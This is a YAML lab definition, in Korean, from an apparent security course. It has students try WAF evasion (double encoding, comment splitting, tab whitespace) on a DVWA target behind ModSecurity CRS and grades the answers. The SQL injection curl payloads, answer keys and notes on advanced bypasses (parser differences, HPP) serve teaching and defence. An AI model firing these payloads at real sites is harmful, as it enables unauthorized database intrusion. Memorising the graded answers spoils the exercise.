lab_id: standalone-attack-week10
title: "필터 우회(인코딩·분할·난독화) vs 정규화 방어"
version: standalone-attack
course: attack
week: 10
description: |
  WAF 필터를 빠져나가는 우회 기법 — 인코딩(이중/유니코드), 분할(주석/공백), 난독화(대소문자)와 그에
  맞서는 ModSec CRS의 정규화(transformation). 같은 공격을 다르게 표현해도 정규화로 대부분 잡힘을 본다.
  공격은 el34-attacker. 인가된 실습만. 명령은 el34 호스트에서.
difficulty: medium
duration_minutes: 160
prerequisites:
  - "W04–W05(SQLi/XSS·WAF) 통과"
  - "el34 호스트 SSH + docker exec"
  - "lecture §2(인코딩) §3(분할) §4(정규화) 숙지"
objectives:
  - "인코딩/분할/난독화 우회 시도"
  - "ModSec 정규화의 효과(대부분 여전히 차단) 이해"
  - "우회의 한계와 고급 방향"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 점검 — 대상
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
      ```
      ## ✅ 합격 기준
      대상 도달.
    hint: '도달성'
    category: survey
    points: 10
    answer: |
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
    answer_detail: "필터 우회 대상 = dvwa(차단 모드, ModSec CRS)."
    verify:
      type: output_contains
      expect: 'dvwa'
      field: stdout
      semantic:
        intent: "대상 점검"
        success_criteria: ["도달"]
        acceptable_methods: ["**[OSS] curl (권장)**"]
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 기준 공격 — 평문 SQLi (baseline)
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'plain=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
      ```
      ## ✅ 합격 기준
      평문 SQLi가 403(baseline)이다.
    hint: '평문 UNION → 403'
    category: manipulation
    points: 12
    answer: |
      echo "=== 기준 공격 (평문 SQLi) ==="
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'plain=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
      echo "→ 평문 SQLi = 403(차단). 이게 baseline. 우회로 이걸 통과시킬 수 있나?"
    answer_detail: "baseline = 평문 SQLi → 403. 우회 기법이 이 차단을 통과시키는지가 관건."
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: "기준 공격 baseline"
        success_criteria: ["평문 SQLi 403"]
        acceptable_methods: ["**[OSS] 평문 SQLi (권장)**"]
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 인코딩 우회 — 이중/유니코드
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dbl=%{http_code} ' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%2527%20UNION%20SELECT'"
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'mix=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%20%55NION%20%53ELECT'"
      ```
      ## ✅ 합격 기준
      인코딩 우회 시도의 결과(대부분 여전히 403)를 확인한다.
    hint: '이중인코딩 %2527, %55NION'
    category: manipulation
    points: 12
    answer: |
      echo "=== 인코딩 우회 ==="
      echo "[이중 인코딩]"; docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dbl=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%2527%20UNION%20SELECT'"
      echo "[부분 URL 인코딩]"; docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'mix=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%20%55NION%20%53ELECT'"
      echo "→ %55=U 등 인코딩 → CRS가 t:urlDecodeUni로 디코드 후 검사 → 대부분 여전히 403"
    answer_detail: "인코딩 우회 = 같은 문자를 인코딩으로 표현(%55=U). CRS의 t:urlDecodeUni transformation이 디코드 후 검사 → 우회 실패(403)."
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: "인코딩 우회 시도 + 정규화"
        success_criteria: ["인코딩 시도", "정규화로 차단"]
        acceptable_methods: ["**[OSS] 인코딩 payload (권장)**"]
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 분할·난독화 — 주석/공백/대소문자
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'cmt=%{http_code} ' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT'"
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'tab=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%09UNION%09SELECT'"
      ```
      ## ✅ 합격 기준
      분할/난독화 우회 결과(대부분 여전히 403)를 확인한다.
    hint: 'UN/**/ION 주석, %09 탭'
    category: manipulation
    points: 12
    answer: |
      echo "=== 분할·난독화 ==="
      echo "[주석 분할]"; docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'cmt=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT'"
      echo "[탭 공백]"; docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'tab=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%09UNION%09SELECT'"
      echo "→ 주석(/**/)·탭(%09)으로 키워드 분할 → CRS t:removeComments/compressWhitespace로 정규화 → 403"
    answer_detail: "분할/난독화 = 주석/공백/대소문자로 키워드 쪼개기. CRS의 t:removeComments, t:compressWhitespace, t:lowercase가 정규화 → 우회 실패."
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: "분할/난독화 우회 시도"
        success_criteria: ["주석/공백 시도", "정규화로 차단"]
        acceptable_methods: ["**[OSS] 주석/탭 payload (권장)**"]
    target_vm: web

  - order: 5
    instruction: |
      ## 🎯 정규화 확인 — CRS가 이긴다
      ## 💻 실행 명령
      ```bash
      echo "평문/이중인코딩/주석/탭/대소문자 → 모두 정규화 후 같은 패턴 → 대부분 403"
      ```
      ## ✅ 합격 기준
      정규화로 우회가 무력화됨을 정리한다.
    hint: '정규화 transformation'
    category: analysis
    points: 12
    answer: |
      echo "=== 정규화 효과 (CRS transformation) ==="
      echo "t:urlDecodeUni  → %55→U, %2527→' (인코딩 무력화)"
      echo "t:removeComments → UN/**/ION → UNION (주석 무력화)"
      echo "t:compressWhitespace → %09/다중공백 → 단일 (공백 무력화)"
      echo "t:lowercase → UnIoN → union (대소문자 무력화)"
      echo "→ 모든 표현이 정규화 후 동일 패턴 → 942 매칭. 단순 우회는 CRS에 무력"
    answer_detail: "CRS가 우회를 이기는 핵심 = 검사 전 정규화(transformation). 인코딩/주석/공백/대소문자를 통일해 같은 패턴으로 만든 뒤 검사."
    verify:
      type: output_contains
      expect: '정규화'
      field: stdout
      semantic:
        intent: "정규화 효과 이해"
        success_criteria: ["transformation 종류", "우회 무력화"]
        acceptable_methods: ["**[설명] 정규화 (권장)**"]
    target_vm: web

  - order: 6
    instruction: |
      ## 🎯 탐지 분석 — ModSec 942
      ## 💻 실행 명령
      ```bash
      docker exec el34-web sh -c 'sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c'
      ```
      ## ✅ 합격 기준
      우회 시도들이 정규화 후 942에 탐지됨을 확인한다.
    hint: 'modsec 942'
    category: analysis
    points: 12
    answer: |
      echo "=== 탐지 (정규화 후 942) ==="
      docker exec el34-web sh -c 'sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c'
      echo "→ 인코딩/주석/공백 우회 모두 정규화 후 942(SQLi)에 탐지. CRS의 강점"
    answer_detail: "모든 우회 시도가 정규화 후 942에 탐지. 표현은 달라도 정규화하면 같은 공격 — CRS가 다양한 우회를 한 룰군으로."
    verify:
      type: output_contains
      expect: '942'
      field: stdout
      semantic:
        intent: "우회 시도의 탐지 확인"
        success_criteria: ["942 탐지"]
        acceptable_methods: ["**[OSS] modsec 942 (권장)**"]
    target_vm: web

  - order: 7
    instruction: |
      ## 🎯 우회 한계 + 고급
      ## 💻 실행 명령
      ```bash
      echo "단순 우회=무력. 고급=정규화가 놓치는 표현(특정 charset/컨텍스트/파서 차이), HPP, 페이로드 분산"
      ```
      ## ✅ 합격 기준
      우회의 한계와 고급 방향을 정리한다.
    hint: '정규화 놓치는 표현, HPP'
    category: analysis
    points: 10
    answer: |
      echo "=== 우회 한계 + 고급 ==="
      echo "단순 우회(인코딩/주석/대소문자): CRS 정규화에 무력"
      echo "고급: 정규화가 놓치는 표현(특이 charset/overlong UTF-8), 파서 차이(WAF vs 백엔드), HPP(파라미터 오염), 페이로드 분산/시간차"
      echo "→ WAF 우회는 가능하나 어렵고 환경 특이적. WAF는 시간을 벌어주는 보조 방어"
    answer_detail: "우회의 현실 = 단순 기법은 무력, 고급은 정규화-백엔드 파서 차이를 악용(환경 특이적). WAF는 완벽하지 않지만 진입장벽을 크게 높인다."
    verify:
      type: output_contains
      expect: 'HPP'
      field: stdout
      semantic:
        intent: "우회 한계 + 고급 방향"
        success_criteria: ["단순 무력", "고급(파서차이/HPP)"]
        acceptable_methods: ["**[설명] 우회 한계 (권장)**"]
    target_vm: web

  - order: 8
    instruction: |
      ## 🎯 필터 우회 보고서
      ## 💻 보고서 양식
      ```markdown
      # 공격 W10 필터 우회 보고서 (학번, 이름)
      ## 1. 기준 공격(403) + 우회 시도(인코딩/분할/난독화)
      ## 2. 정규화 방어(transformation)
      ## 3. 탐지(942) + 우회 한계
      ```
      ## ✅ 합격 기준
      보고서에 우회 시도 + 정규화 방어가 포함된다.
    hint: '우회+정규화+한계'
    category: report
    points: 10
    answer: |
      cat <<'EOF'
      # 공격 W10 필터 우회 보고서
      ## 1. 기준: 평문 SQLi 403. 우회: 이중인코딩/유니코드/주석분할/탭/대소문자
      ## 2. 정규화: CRS transformation(urlDecodeUni/removeComments/compressWhitespace/lowercase)으로 통일
      ## 3. 탐지: 모든 우회 → 정규화 후 942. 한계: 단순 무력, 고급은 파서차이/HPP(환경특이)
      ## 결론: 같은 공격을 다르게 표현해도 정규화가 통일 → CRS가 이긴다. 우회는 어렵다
      EOF
    answer_detail: "필터 우회 vs 정규화 = 표현 다양화 vs 표현 통일. CRS 정규화가 단순 우회를 이긴다. 고급 우회는 파서 차이 악용."
    verify:
      type: output_contains
      expect: '우회'
      field: stdout
      semantic:
        intent: "필터 우회 종합 보고"
        success_criteria: ["우회 시도/정규화/한계"]
        acceptable_methods: ["**[관리적] 우회 보고서 (권장)**"]
    target_vm: web
